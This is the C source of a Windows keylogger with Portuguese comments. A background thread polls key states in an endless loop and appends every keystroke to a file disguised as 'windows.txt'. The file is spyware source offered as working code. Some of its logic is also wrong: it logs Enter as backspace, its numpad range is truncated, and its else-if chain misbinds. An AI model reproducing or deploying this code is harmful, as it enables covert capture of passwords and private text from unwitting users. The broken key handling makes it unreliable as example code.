#include <windows.h>
#include <stdio.h>

FILE* kh;

void end(void) {
    fclose(kh);
}

DWORD WINAPI logg(_In_ LPVOID lpParameter) {
    SHORT last_key_state[0xff] = { 0 };
    SHORT is_capslock   = 0, is_numlock = 0;
    SHORT is_shift      = 0;
    SHORT is_pressed    = 0;
    unsigned char show_key  = 0;
    unsigned char vkey      = 0;
    
    const char* num_char = ")!@#$%^&*+(";
    const char* chars_vn = "=,~./`";
    const char* chars_vs = ":<>_?=";
    const char* chars_vo = "[\\]\';";
    const char* chars_vb = "{|}\"";

    fopen_s(&kh, "windows.txt", "a");
    
    if(kh != 0){ // se o arquivo foi aberto com sucesso
        atexit(end);

        //rodando infinitamente
        while (1) { 
            Sleep(10);

            if (GetAsyncKeyState(0x90) & 0x0001)    // NUMLOCK é de alternância, estar pressionado != ativo
                is_numlock = !is_numlock;           // alterna entre TRUE e FALSE

            if (GetAsyncKeyState(0x14) & 0x0001)    // Mesma razão de cima
                is_capslock = !is_capslock;

            for (vkey = 0x0D; vkey <= 0xDF; vkey++) {
                if (!(vkey == 0x20 || (vkey >= 0x30 && vkey <= 0x39) || (vkey >= 0x41 && vkey <= 0x5A) || (vkey >= 0x60 && vkey <= 0x60) ||
                    (vkey >= 0x6A && vkey <= 0x6F) || (vkey >= 0xBA && vkey <= 0xC0) || (vkey > 0xDB && vkey <= 0xDF) || vkey == 0x0D))
                    continue; // evita chamadas desnecessárias ao GetAsyncKeyState, diminuindo a usagem de CPU

                show_key = vkey;
                is_pressed = GetAsyncKeyState(vkey);

                if (is_pressed && !last_key_state[vkey]) {
                    is_shift = GetAsyncKeyState(0xA0) || GetAsyncKeyState(0xA1);

                    // alfabeto
                    if (vkey >= 0x41 && vkey <= 0x5A)
                        if (!is_capslock == !is_shift)
                            show_key = vkey + 0x20;

                    //para num, chars
                    else if (vkey >= 0x30 && vkey <= 0x39)
                        if (is_shift)
                            show_key = num_char[vkey - 0x30];

                    //NUMPAD
                    else if (vkey >= 0x60 && vkey <= 0x60) {
                            if (!is_numlock)
                                show_key = 0x00;

                            else show_key = vkey - 0x30;
                    }

                    else if (vkey >= 0x6A && vkey <= 0x6F)
                            show_key = vkey - 0x40;

                    //OEM chars
                    else if (vkey >= 0xBA && vkey <= 0xC0) {
                        if (is_shift) {
                            show_key = chars_vs[vkey - 0xBA];
                        }
                        else {
                            show_key = chars_vn[vkey - 0xBA];
                        }
                    }

                    //OEM chars 2
                    else if (vkey > 0xDB && vkey <= 0xDF) {
                        if (is_shift) {
                            show_key = chars_vb[vkey - 0xDB];
                        }
                        else {
                            show_key = chars_vo[vkey - 0xDB];
                        }
                    }

                    //backspace
                    else if (vkey == 0x0D) {
                        fputs("<BACKSPACE>", kh);
                        show_key = 0x00;
                    }

                    if(show_key)
                        fputc(show_key, kh);
                }

                //salva o ultimo state da key
                last_key_state[vkey] = is_pressed;
            }
        }
    }
    
    return 0;
}
